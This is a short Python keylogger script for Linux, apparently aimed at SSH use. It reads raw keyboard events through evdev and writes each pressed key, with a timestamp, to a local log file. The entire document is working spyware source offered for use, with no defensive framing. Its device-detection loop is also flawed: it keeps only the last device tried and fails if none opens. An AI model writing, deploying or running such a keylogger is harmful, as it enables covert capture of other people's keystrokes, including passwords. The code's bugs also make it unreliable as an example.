#!/usr/bin/env python3
# Simple Keylogger for Linux (SSH)

from evdev import InputDevice, categorize, ecodes
import logging

def on_press(key):
    logging.info(str(key))
    print(f"{key} pressed")

def main():
    for i in range(9):
        try:
            device = InputDevice(f'/dev/input/event{i}')  # Replace 'X' with the appropriate event number for your keyboard
        except OSError as e:
            print(f"Keyboard not found at event{i}")
            print(e)

    logging.basicConfig(filename='keylog.txt', level=logging.DEBUG, format=' %(asctime)s - %(message)s')

    for event in device.read_loop():
        if event.type == ecodes.EV_KEY:
            key_event = categorize(event)
            if key_event.keystate == key_event.key_down:
                on_press(key_event.keycode)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Program Terminated")
        exit()
